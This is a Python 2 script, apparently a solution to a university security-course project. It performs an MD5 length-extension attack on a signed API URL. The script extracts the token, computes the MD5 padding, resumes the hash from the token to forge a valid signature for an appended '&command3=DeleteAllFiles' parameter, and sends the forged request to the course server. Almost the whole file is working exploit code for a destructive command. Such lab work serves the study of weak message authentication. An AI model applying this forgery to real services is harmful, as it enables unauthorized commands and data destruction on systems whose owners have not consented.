from pymd5 import md5, padding
import httplib, urlparse, sys
import urllib
#error unless url is wrapped in quotes
url = sys.argv[1]

# print("\n\n")
# print(url)
# print("\n\n")

# url ="https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp"

# find the tokenn on a variable length url

tokenLocation = url.index('token=') + 6
messageLocation = url.index('user=')
messageLength = len(url) - messageLocation +8

# print("Original message length:")
# print(messageLength)
# print("\n")

pad = padding(messageLength*8)
message = ''
while (messageLocation < len(url)):
    message += url[messageLocation]
    messageLocation+=1

# print("Original message:")
# print(message)
# print("\n")

token = ''
end = tokenLocation+32
i = tokenLocation

while (i < end):
    token += url[i]
    i +=1

# print"Token is:"
# print token
# print"\nURL is:"
# print url

newAddition = "&command3=DeleteAllFiles"

newH = md5(state=token.decode("hex"), count=512)
newH.update(newAddition)
newtoken=newH.hexdigest()

# print"\nNew token is:"
# print newtoken
# print"\nPad is:"
# print pad

newUrl = 'https://ecen5032.org/project1/api?token='+newtoken+'&'+message+urllib.quote(pad)+'&command3=DeleteAllFiles'
url += newAddition

url = url.replace(token, newtoken)

# print "\n New URL is:"
# print newUrl

# temp = 'https://ecen5032.org/project1/api?token=d0c7a65c690cf624cdc94dc551cc1c5c&user=admin&command1=ListFiles&command2=NoOp'

parsedUrl = urlparse.urlparse(newUrl)
conn = httplib.HTTPSConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print"\n Server Response:"
print conn.getresponse().read()
